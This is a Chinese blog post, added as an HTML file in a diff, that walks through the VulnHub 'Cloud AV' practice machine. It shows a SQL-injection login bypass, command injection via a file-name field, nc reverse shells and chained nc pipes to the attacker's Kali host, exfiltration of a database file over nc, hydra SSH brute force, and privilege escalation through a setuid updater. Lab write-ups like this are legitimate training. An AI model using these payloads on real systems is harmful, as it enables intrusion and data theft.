@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="//cdn.staticfile.org/Primer/21.0.7/primer.css" rel="stylesheet" />
+    <link rel="icon" href="https://cos.kevinc.ltd/file/download?fileId=1419">
+    <script>
+        if(localStorage.getItem("meek_theme")==null){}
+        else if(localStorage.getItem("meek_theme")=="dark"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";}
+        else if(localStorage.getItem("meek_theme")=="light"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";}
+    </script>
+    
+<title>靶场练习2：cloudantvirus</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<span class="postTitle">靶场练习2：cloudantvirus</span>
+<div class="title-right">
+
+    <a href="/"><button id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd" d="M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z"></path>
+        </svg>
+    </button></a>
+
+    <a href="https://github.com/cha0s32/cha0s32.github.io/issues/5" target="_blank"><button class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+        </svg>
+    </button></a>
+
+    <button class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </button>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody">
+<h2>靶场链接</h2>
+<p><a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/" rel="nofollow">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></p>
+<h2>信息收集</h2>
+<p>练习1用了<code class="notranslate">arp-scan</code>，这种工具有可能会被防火墙流量监测到，所以可以使用<code class="notranslate">arping</code>, 这种工具基本<code class="notranslate">Linux</code>发行版都会自带。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">$(</span>seq 1 255<span class="pl-pds">)</span></span><span class="pl-k">;</span><span class="pl-k">do</span> sudo arping -c 2 192.168.31.<span class="pl-smi">$i</span><span class="pl-k">;</span><span class="pl-k">done</span></pre></div>
+<p>根据回包来判断靶机地址。</p>
+<p>下一步，扫描端口和服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo nmap -p- 192.168.31.197
+
+sudo nmap -p22.8080 192.168.31.197</pre></div>
+<p>扫描到有<code class="notranslate">ssh</code>和<code class="notranslate">http</code>服务， <code class="notranslate">web</code>服务使用<code class="notranslate">Python</code>写的框架。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6010a68281f3ed8a9762e9bd8607a2db98a6ca00242b57011b9141ee31b742ed/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343933"><img src="https://camo.githubusercontent.com/6010a68281f3ed8a9762e9bd8607a2db98a6ca00242b57011b9141ee31b742ed/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343933" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=493" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b14c02cb55a56abe631a19d39f53bc5ee095f3136cfb3fba40c02e04ac621dd4/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343934"><img src="https://camo.githubusercontent.com/b14c02cb55a56abe631a19d39f53bc5ee095f3136cfb3fba40c02e04ac621dd4/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343934" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=494" style="max-width: 100%;"></a></p>
+<h2>漏洞利用</h2>
+<p>访问Web服务，出现搜索框要求输入邀请码，有两种思路，暴破和注入。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ecd0ad9fa0dc7fd09ab6e54cc0dd1c664891a8fc3194dc3c64207599766fe855/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343935"><img src="https://camo.githubusercontent.com/ecd0ad9fa0dc7fd09ab6e54cc0dd1c664891a8fc3194dc3c64207599766fe855/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343935" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=495" style="max-width: 100%;"></a></p>
+<p>注入的小技巧：先对所有键盘输入的特殊字符进行暴破，若存在状态码和回包长度不一致的，很有可能可以用于构造闭合语句。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c7e0f1a374fc2ac26e1b544ffb1d091e7c3f547e209707a997bfa0dd92ff9ec9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343936"><img src="https://camo.githubusercontent.com/c7e0f1a374fc2ac26e1b544ffb1d091e7c3f547e209707a997bfa0dd92ff9ec9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343936" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=496" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/94b4b7870016a407f3c3d3ef5978be315fdf528e31b0766644e2b1eec772e9a9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343937"><img src="https://camo.githubusercontent.com/94b4b7870016a407f3c3d3ef5978be315fdf528e31b0766644e2b1eec772e9a9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343937" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=497" style="max-width: 100%;"></a></p>
+<p>回包显示网页使用了<code class="notranslate">Flask</code>框架，且明确显示了数据库查询语句。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d28c95e456b599718615521697c016dfe40f3fb27b9b678db49440404450b970/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343938"><img src="https://camo.githubusercontent.com/d28c95e456b599718615521697c016dfe40f3fb27b9b678db49440404450b970/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343938" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=498" style="max-width: 100%;"></a></p>
+<p>尝试使用万能密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-s"><span class="pl-pds">"</span> or 1=1--+</span></pre></div>
+<p>顺利登录，返回一个病毒扫描页面。文本框要求输入一个文件名称，逻辑一般是文件名拼接扫描命令，可以尝试命令执行。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/28f5435de63ad73314dc69c62c2918445385fcab0f0079663690503521867763/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343939"><img src="https://camo.githubusercontent.com/28f5435de63ad73314dc69c62c2918445385fcab0f0079663690503521867763/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d343939" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=499" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">hello <span class="pl-k">|</span> ls</pre></div>
+<p>网页顺利回显了文件列表，证明了命令执行的存在。此时可以尝试写入反弹shell，因为框架使用<code class="notranslate">Python</code>写的，可以使用<code class="notranslate">Python</code>的反弹shell。 如果靶机环境存在  <code class="notranslate">netcat</code>, 也可以利用 <code class="notranslate">nc</code> 构建反弹shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> kali</span>
+
+nc -nvlp 4444
+
+<span class="pl-c"><span class="pl-c">#</span> 文本框</span>
+
+nc 192.168.31.157 4444 -e /bin/bash</pre></div>
+<p>监听端口后无回显，可能是因为靶机环境的 <code class="notranslate">netcat</code> 版本过低，并不支持 <code class="notranslate">-e</code> 参数。</p>
+<p>将之删掉后，显示连接已建立。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/65ffb704b0ad80af525e8a964c885271b4d1f04246ff7a758de1e406b763a767/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353030"><img src="https://camo.githubusercontent.com/65ffb704b0ad80af525e8a964c885271b4d1f04246ff7a758de1e406b763a767/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353030" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=500" style="max-width: 100%;"></a></p>
+<p>此时要用到的小技巧叫 <code class="notranslate">nc</code>串联：靶机反向连接 <code class="notranslate">kali</code> , 通过管道符将输入的命令传入 <code class="notranslate">/bin/bash</code>，然后再通过管道符将结果反向输出到 <code class="notranslate">kali</code> 的另一个端口上。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">hello <span class="pl-k">|</span> nc 192.168.31.157 3333 <span class="pl-k">|</span> /bin/bash <span class="pl-k">|</span> nc 192.168.31.157 4444</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/943fd21f65fbb90cf9adc99078d0a4a29bdfd713e9a5e104dc2aa10f32d43644/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353031"><img src="https://camo.githubusercontent.com/943fd21f65fbb90cf9adc99078d0a4a29bdfd713e9a5e104dc2aa10f32d43644/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353031" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=501" style="max-width: 100%;"></a></p>
+<p>此时<code class="notranslate">kali</code>终端中左侧输入的命令，执行后结果在右侧可显示输出。</p>
+<h2>提权</h2>
+<p>查看一下文件权限和文件列表，除了数据库文件外，其他文件对提权并没有作用。使用<code class="notranslate">file database.sql</code>得到数据库是 <code class="notranslate">sqlites</code>，该数据库是本地数据库，然而靶机环境中并没有读取数据库的工具，所以要把它传输到<code class="notranslate">kali</code>中读取。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> kali</span>
+
+nc -nvlp 5555 <span class="pl-k">&gt;</span> db.sql
+
+<span class="pl-c"><span class="pl-c">#</span> 靶机</span>
+
+nc 192.168.31.157 5555 <span class="pl-k">&lt;</span> database.sql</pre></div>
+<p>传输完成后使用<code class="notranslate">kali</code> 的 <code class="notranslate">sqlite3</code> 工具进行数据库文件的读取。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2d0937642cf5c923d6e7e4752747f77d2851ca2e97f49a6f3490e9ad0b41d591/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353032"><img src="https://camo.githubusercontent.com/2d0937642cf5c923d6e7e4752747f77d2851ca2e97f49a6f3490e9ad0b41d591/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353032" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=502" style="max-width: 100%;"></a></p>
+<p>发现数据库中都是密码字段，同时在靶机上<code class="notranslate">cat /etc/passwd</code>可以获取用户字段，我们可以用这些信息各自构造一个字段来对靶机的<code class="notranslate">ssh</code> 服务进行暴破。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">hydra -L usr.txt -P pass.txt ssh://192.168.31.197</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9900074b0c806f6f8eaf60650c571f383646dc48b41a1c3d2f13eea6e270e63b/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353034"><img src="https://camo.githubusercontent.com/9900074b0c806f6f8eaf60650c571f383646dc48b41a1c3d2f13eea6e270e63b/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353034" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=504" style="max-width: 100%;"></a></p>
+<p>暴破并不成功，寻找另外一种思路。使用<code class="notranslate">pwd</code>看看当前目录，本目录下没有其他线索可用了，退到上一级目录看看。</p>
+<p>通过文件列表，可以看到有一个可执行文件具有<code class="notranslate">suid</code>权限，且据推测应该由该目录下一个<code class="notranslate">.c</code>文件编译而来。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f55dfd96a4099451107d2687daa9567a7ca7772a2862a0290c40360482af875f/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353035"><img src="https://camo.githubusercontent.com/f55dfd96a4099451107d2687daa9567a7ca7772a2862a0290c40360482af875f/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353035" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=505" style="max-width: 100%;"></a></p>
+<p>通过查看<code class="notranslate">.c</code>文件可以看到，该文件的功能是对<code class="notranslate">cloudav</code>进行升级，且命令后带一个参数，可以利用<code class="notranslate">suid</code>尝试在参数上构造管道拼接提权。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">./update_cloudav <span class="pl-s"><span class="pl-pds">"</span>a|nc 192.168.31.57 5555| /bin/bash | nc 192.168.31.157 6666 </span></pre></div>
+<p>同时在<code class="notranslate">kali</code>上监听这两个端口，可以发现提权成功。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/02171c6784147b4802a36b2711e0800cf348b6af6ce22bad0dc3c42bead5bbec/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353036"><img src="https://camo.githubusercontent.com/02171c6784147b4802a36b2711e0800cf348b6af6ce22bad0dc3c42bead5bbec/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d353036" alt="" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=506" style="max-width: 100%;"></a></p>
+</div>
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+</div>
+    <div id="footer">Copyright © <span id="year"></span><a href="https:/cha0s32.github.io"> 呆毛的博客 </a>
+<p>
+<span id="runday"></span>Powered by <a href="https://github.com/Meekdai/Gmeek" target="_blank">Gmeek</a>
+</p>
+
+<script>
+if(""!=""){
+    var now=new Date();
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("year").innerHTML=now.getFullYear();
+    if(""!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
+    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
+}
+</script>
+</div>
+</body>
+<script>
+var IconList={'post': 'M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25Zm1.75-.25a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25ZM3.5 6.25a.75.75 0 0 1 .75-.75h7a.75.75 0 0 1 0 1.5h-7a.75.75 0 0 1-.75-.75Zm.75 2.25h4a.75.75 0 0 1 0 1.5h-4a.75.75 0 0 1 0-1.5Z', 'link': 'm7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z', 'about': 'M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z', 'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'rss': 'M2.002 2.725a.75.75 0 0 1 .797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 0 1-1.497.098 10.502 10.502 0 0 0-9.776-9.776.747.747 0 0 1-.7-.798ZM2.84 7.05h-.002a7.002 7.002 0 0 1 6.113 6.111.75.75 0 0 1-1.49.178 5.503 5.503 0 0 0-4.8-4.8.75.75 0 0 1 .179-1.489ZM2 13a1 1 0 1 1 2 0 1 1 0 0 1-2 0Z', 'upload': 'M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z M11.78 4.72a.749.749 0 1 1-1.06 1.06L8.75 3.811V9.5a.75.75 0 0 1-1.5 0V3.811L5.28 5.78a.749.749 0 1 1-1.06-1.06l3.25-3.25a.749.749 0 0 1 1.06 0l3.25 3.25Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z'};
+var utterancesLoad=0;
+if(localStorage.getItem("meek_theme")==null){localStorage.setItem("meek_theme","light");changeLight();}
+else if(localStorage.getItem("meek_theme")=="dark"){changeDark();}
+else if(localStorage.getItem("meek_theme")=="light"){changeLight();}
+
+function changeDark(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["moon"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#00f0ff";
+    if(utterancesLoad==1){utterancesTheme("dark-blue");}
+}
+function changeLight(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["sun"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#ff5000";
+    if(utterancesLoad==1){utterancesTheme("github-light");}
+}
+function modeSwitch(){
+    if(document.getElementsByTagName("html")[0].attributes[0].value=="light"){changeDark();localStorage.setItem("meek_theme","dark");}
+    else{changeLight();localStorage.setItem("meek_theme","light");}
+}
+function utterancesTheme(theme){
+    const message = {type: 'set-theme',theme: theme};
+    const iframe = document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+}
+
+console.log("\n %c Gmeek last %c https://github.com/Meekdai/Gmeek \n\n", "color: #fff; background-image: linear-gradient(90deg, rgb(47, 172, 178) 0%, rgb(45, 190, 96) 100%); padding:5px 1px;", "background-image: linear-gradient(90deg, rgb(45, 190, 96) 0%, rgb(255, 255, 255) 100%); padding:5px 0;");
+</script>
+
+<script>
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","cha0s32/cha0s32.github.io");
+    script.setAttribute("issue-term","title");
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else{script.setAttribute("theme","github-light");}
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+</script>
+
+
+
+
+</html>
